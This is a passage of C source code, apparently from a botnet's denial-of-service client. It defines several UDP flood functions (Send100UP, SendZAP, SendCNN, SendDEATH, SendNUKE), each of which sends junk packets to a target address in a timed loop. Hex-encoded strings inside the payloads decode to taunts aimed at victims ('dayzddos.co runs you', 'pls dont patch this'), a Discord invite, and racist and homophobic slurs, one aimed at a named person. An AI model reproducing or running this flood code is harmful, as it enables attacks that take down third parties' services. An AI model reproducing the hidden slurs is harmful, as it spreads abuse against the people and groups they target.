    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb"
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}


    void Send100UP(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
    "\x56\x69\x78\x61\x61\x74\x69\x53\x65\x72\x76\x69\x63\x65\x73\x20\x50\x61\x69\x6e\x20\x53\x52\x43\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x72\x20\x73\x68\x69\x74\x20\x6e\x69\x67\x67\x61\x61\x61\x61\x20\x6c\x6f\x6c\x20\x78\x64\x78\x64\x78\x64\x78\x64\x56\x69\x78\x61\x61\x74\x69\x53\x65\x72\x76\x69\x63\x65\x73\x20\x50\x61\x69\x6e\x20\x53\x52\x43\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x72\x20\x73\x68\x69\x74\x20\x6e\x69\x67\x67\x61\x61\x61\x61\x20\x6c\x6f\x6c\x20\x78\x64\x78\x64\x78\x64\x78\x64",
    "\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73\x20\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73\x20\x70\x6c\x73\x20\x64\x6f\x6e\x74\x20\x70\x61\x74\x63\x68\x20\x74\x68\x69\x73",
    "\x64\x69\x73\x63\x6f\x72\x64\x20\x64\x6f\x74\x20\x67\x67\x20\x73\x6c\x61\x73\x68\x20\x62\x64\x64\x48\x7a\x47\x67\x4b\x47\x37",
    "VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...VixaatiServices...",
    "\x6a\x61\x79\x20\x69\x73\x20\x61\x20\x66\x61\x67\x67\x6f\x74",
    "\x61\x64\x64\x20\x69\x6c\x6c\x75\x6d\x69\x6e\x61\x74\x65\x23\x30\x30\x33\x38\x20\x66\x6f\x72\x20\x67\x61\x79\x20\x73\x65\x78"
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendZAP(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendCNN(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendDEATH(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
    void SendNUKE(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
        "\x26\x3C\x35\x35\x36\x3D\x20\x77\x75\x31\x76\x35\x30\x77\x28\x7D\x27\x29\x7D\x7D\x34\x36\x3C\x21\x73\x30\x2D\x2D\x29\x77\x77\x2A\x2B\x32\x37\x2F\x2B\x72\x73\x22\x36\x7C\x31\x24\x21\x73\x7C\x28\x36\x77\x72\x34\x72\x24\x70\x2E\x2B\x3F\x28\x26\x23\x24\x2F\x71\x7D\x7C\x72\x7C\x74\x26\x28\x21\x32\x2F\x23\x33\x20\x20\x2C\x2F\x7C\x20\x23\x28\x2A\x2C\x20\x2E\x36\x73\x2A\x27\x74\x31\x7D\x20\x33\x2C\x30\x29\x72\x3F\x73\x23\x30\x2D\x34\x74\x2B\x2E\x37\x73\x2F\x2B\x71\x35\x2C\x34\x2C\x36\x34\x3D\x28\x24\x27\x29\x71\x2A\x26\x30\x77\x35\x2F\x35\x35\x37\x2E\x2F\x28\x72\x27\x23\x2F\x2D\x76\x31\x36\x74\x30\x29\x45",
        "y8rtyutvybt978b5tybvmx0e8ytnv58ytr57yrn56745t4twev4vt4te45yn57ne46e456be467mt6ur567d5r6e5n65nyur567nn55sner6rnut7nnt7yrt7r6nftynr567tfynxyummimiugdrnyb"
        "\x64\x61\x79\x7a\x64\x64\x6f\x73\x2e\x63\x6f\x20\x72\x75\x6e\x73\x20\x79\x6f\x75\x20\x69\x66\x20\x79\x6f\x75\x20\x72\x65\x61\x64\x20\x74\x68\x69\x73\x20\x6c\x6f\x6c\x20\x74\x68\x65\x6e\x20\x79\x6f\x75\x20\x74\x63\x70\x20\x64\x75\x6d\x70\x65\x64\x20\x69\x74\x20\x62\x65\x63\x61\x75\x73\x65\x20\x69\x74\x20\x68\x69\x74\x20\x79\x6f\x75\x20\x61\x6e\x64\x20\x79\x6f\x75\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x70\x61\x74\x63\x68\x20\x69\x74\x20\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c\x6f\x6c",
        "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A",
        "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA",
        "\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\x2D\x3E\x13\x0D\x32\x20\x33\x62\x63\x12\x21\x2D\x3D\x36\x12\x62\x30\x61\x11\x10\x06\x00\x17\x22\x63\x2D\x02\x01\x6C\x6D\x36\x6C\x0D\x02\x16\x6D\x63\x12\x02\x61\x17\x63\x20\x22\x6C\x2D\x02\x63\x6D\x37\x22\x63\x6D\x00\x02\x2D\x22\x63\x6D\x17\x22\x2D\x21\x22\x63\x00\x30\x32\x60\x30\x00\x17\x22\x36\x36\x6D\x01\x6C\x0D\x12\x02\x61\x20\x62\x63\x17\x10\x62\x6C\x61\x2C\x37\x22\x63\x17\x0D\x01\x3D\x22\x63\x6C\x17\x01\x2D\x37\x63\x62\x00\x37\x17\x6D\x63\x62\x37\x3C\x54",
